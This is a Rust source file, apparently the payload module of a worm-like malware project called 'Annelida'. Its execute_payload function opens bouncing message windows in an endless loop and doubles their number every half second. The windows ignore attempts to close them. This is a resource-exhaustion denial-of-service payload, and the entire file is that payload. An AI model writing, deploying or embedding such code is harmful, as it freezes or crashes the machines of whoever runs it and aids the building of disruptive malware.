use std::thread;
use std::time::Duration;
use winit::{
    event::{Event, WindowEvent},
    event_loop::{ControlFlow, EventLoop},
    platform::windows::EventLoopExtWindows,
    window::WindowBuilder,
};
use rand::Rng;

// Function to exponentially increase the number of windows that open
pub fn execute_payload() {
    let mut count: i32 = 1;
    loop {
        for _ in 0..count {
            thread::spawn(|| {
                message();
            });
        }
        count *= 2;
        thread::sleep(Duration::from_secs_f32(0.5));
    }
}

// Simple message box window with message for payload
fn message() {
    let event_loop: EventLoop<()> = EventLoop::new_any_thread();
    let window = WindowBuilder::new()
        .with_title("Annelida")
        .with_inner_size(winit::dpi::LogicalSize::new(300.0, 200.0))
        .build(&event_loop)
        .unwrap();

    let mut rng = rand::thread_rng();
    let mut x = rng.gen_range(0..1920);
    let mut y = rng.gen_range(0..1080);
    let mut dx = 10;
    let mut dy = 10;

    thread::spawn(move || loop {
        // Update the window position
        window.set_outer_position(winit::dpi::LogicalPosition::new(x, y));

        // Update the coordinates
        x += dx;
        y += dy;

        // Bounce off the edges of the screen
        if x <= 0 || x >= 1920 {
            dx = -dx;
        }
        if y <= 0 || y >= 1080 {
            dy = -dy;
        }

        // Delay to control the speed of the movement
        thread::sleep(Duration::from_millis(50));
    });

    event_loop.run(move |event, _, control_flow| {
        *control_flow = ControlFlow::Wait;
        match event {
            Event::WindowEvent {
                event: WindowEvent::CloseRequested,
                ..
            } => {
                
            }
            _ => (),
        }
    });
}